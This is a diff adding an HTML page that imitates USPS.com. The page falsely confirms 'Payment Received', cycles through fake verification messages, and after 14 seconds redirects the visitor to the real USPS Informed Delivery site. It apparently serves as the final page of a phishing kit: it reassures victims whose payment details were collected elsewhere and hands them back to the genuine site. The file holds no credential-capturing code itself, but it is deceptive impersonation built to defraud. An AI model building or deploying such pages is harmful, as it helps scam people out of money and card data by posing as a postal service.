@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USPS.com – Payment Processing</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link data-testid="favicon" id="favicon" rel="icon" href="https://www.usps.com/assets/images/home/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Helvetica Neue", Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f3f3f3;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        /* Header Styles */
+        header {
+            background: linear-gradient(to bottom, #faf9f6 0%, #faf9f6 100%);
+            color: #333366;
+            padding: 12px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-bottom: 6px solid #333366;
+        }
+        
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 40px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo-icon {
+            width: 221px;
+            height: 34px;
+            background: #faf9f6;
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            padding: 4px;
+            box-shadow: 0 0px 0px rgba(0,0,0,0.2);
+        }
+        
+        .logo-icon img {
+            width: 118px;
+            height: 60px;
+            padding: 20px;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+            letter-spacing: -0.5px;
+        }
+        
+        .header-links {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .header-links a {
+            color: #333366;
+            text-decoration: none;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .header-links a i {
+            margin-right: 5px;
+            font-size: 16px;
+        }
+        
+        .header-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Main Content Styles */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23f8f8f8"/><path d="M0,0 L100,100 M100,0 L0,100" stroke="%23eeeeee" stroke-width="1"/></svg>');
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            text-align: center;
+        }
+        
+        .login-header {
+            background: linear-gradient(to bottom, #f8f8f8 0%, #eaeaea 100%);
+            padding: 30px;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .login-header h1 {
+            font-size: 26px;
+            color: #333366;
+            margin-bottom: 10px;
+        }
+        
+        .login-header p {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .login-body {
+            padding: 40px 30px;
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background-color: #e8f5e9;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid #4caf50;
+        }
+        
+        .success-icon i {
+            font-size: 40px;
+            color: #4caf50;
+        }
+        
+        .processing-text {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 30px;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background-color: #e0e0e0;
+            border-radius: 4px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(to right, #333366, #4c66a4);
+            border-radius: 4px;
+            animation: progress 3s ease-in-out infinite;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; }
+        }
+        
+        .status-message {
+            background-color: #f8f8f8;
+            padding: 15px;
+            border-radius: 4px;
+            border-left: 4px solid #333366;
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+            text-align: left;
+        }
+        
+        .status-message i {
+            color: #333366;
+            margin-right: 8px;
+        }
+        
+        .btn-continue {
+            display: inline-block;
+            margin-top: 25px;
+            padding: 12px 30px;
+            background: linear-gradient(to bottom, #333366 0%, #333366 100%);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-decoration: none;
+        }
+        
+        .btn-continue:hover {
+            background: linear-gradient(to bottom, #333366 0%, #002c55 100%);
+        }
+        
+        /* Footer Styles */
+        footer {
+            background-color: #e6e6e6;
+            padding: 25px 0;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #d0d0d0;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links a {
+            color: #333366;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 10px;
+        }
+        
+        /* Responsive Adjustments */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                text-align: center;
+                gap: 10px;
+            }
+            
+            .logo {
+                margin-bottom: 10px;
+            }
+            
+            .login-container {
+                margin: 0 15px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+        
+        /* Alert Banner */
+        .alert-banner {
+            background-color: #ffc107;
+            color: #856404;
+            padding: 7px 0;
+            text-align: center;
+            font-size: 12px;
+            border-bottom: 1px solid #ffb007;
+        }
+        
+        .alert-banner a {
+            color: #333366;
+            font-weight: bold;
+            text-decoration: underline;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #333366;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="alert-banner">
+            <i class="fas fa-exclamation-circle"></i> Your payment is being securely processed. 
+        </div>
+        
+        <header>
+            <div class="header-container">
+                <div class="logo">
+                    <div class="logo-icon">
+                        <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" alt="USPS Logo">
+                    </div>
+                </div>
+                
+                <div class="header-links">
+                    <a href="#"><i class="fas fa-question-circle"></i> Help</a>
+                    <a href="#"><i class="fas fa-envelope"></i> Contact Us</a>
+                </div>
+            </div>
+        </header>
+        
+        <main class="main-content">
+            <div class="login-container">
+                <div class="login-header">
+                    <h1>Payment Submitted Successfully</h1>
+                    <p>Your transaction is being processed</p>
+                </div>
+                
+                <div class="login-body">
+                    <div class="spinner"></div>
+                    
+                    <div class="success-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    
+                    <h2 style="color: #4caf50; margin-bottom: 15px;">Payment Received</h2>
+                    
+                    <p class="processing-text">
+                        Thank you for your payment. Your transaction has been submitted successfully and is currently being processed.
+                    </p>
+                    
+                    <div class="progress-container">
+                        <div class="progress-bar"></div>
+                    </div>
+                    
+                    <p style="color: #666; margin-bottom: 20px;">
+                        <i class="fas fa-info-circle"></i> We will get back to you shortly with a confirmation.
+                    </p>
+                    
+                    <div class="status-message">
+                        <p><i class="fas fa-shield-alt"></i> Your payment is being processed securely. This may take a few moments.</p>
+                    </div>
+                    
+                    <a href="#" class="btn-continue">Return to Homepage</a>
+                </div>
+            </div>
+        </main>
+        
+        <footer>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Use</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Careers</a>
+                <a href="#">Site Index</a>
+                <a href="#">USPS.com</a>
+            </div>
+            <div class="copyright">
+                &copy; 2025 USPS.com. All rights reserved.
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Simulate processing delay and redirect after 14 seconds
+        setTimeout(function() {
+            window.location.href = "https://reg.usps.com/informeddelivery/welcome?_gl=1*f4skzh*_ga*MTMxNzk5NTc5OS4xNzU4NDA3MDc0*_ga_QM3XHZ2B95*czE3NTg1ODYwOTEkbzQkZzEkdDE3NTg1ODYyMDgkajI2JGwwJGgw";
+        }, 14000);
+        
+        // Update progress message every few seconds
+        let messages = [
+            "Verifying payment details...",
+            "Processing transaction...",
+            "Finalizing payment...",
+            "Almost complete..."
+        ];
+        
+        let messageIndex = 0;
+        const statusMessage = document.querySelector('.status-message p');
+        
+        setInterval(function() {
+            statusMessage.innerHTML = `<i class="fas fa-shield-alt"></i> ${messages[messageIndex]}`;
+            messageIndex = (messageIndex + 1) % messages.length;
+        }, 3000);
+    </script>
+</body>
+</html>
